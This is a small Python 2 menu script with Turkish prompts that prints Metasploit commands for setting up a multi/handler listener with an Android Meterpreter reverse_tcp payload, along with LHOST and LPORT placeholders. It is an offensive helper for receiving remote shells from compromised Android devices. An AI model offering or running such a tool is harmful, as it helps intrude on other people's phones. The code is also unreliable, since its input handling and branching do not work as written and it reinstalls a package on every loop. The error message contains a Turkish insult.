#!/usr/bin/env python2

import os
while True:
	os.system("pkg install toilet")
	os.system("clear")
	os.system("toilet -f mono12 -F gay Swoyzi")
	print("""

01)msf payload 
02)Peyoad msf
03)LHOST 
04)LPORT
Q)quit
""")



	islemno  =   input ( "işlem numarasıgir= ")

	if  islemno == "01" :
		print("use exploit/multi/handler")
	if islemno =="02":
		print("set payload android/meterpreter/reverse_tcp")
	if islemno =="03":
		print("set LHOST  msfvenom payload a girdigin ip")
	if islemno =="04": 
		print("set LPORT girdigin port")

	elif islemno=="q" or islemno=="Q":
			quit()
	else:
		input("hatalı girdin orospu devam etmek  icin entere bas")
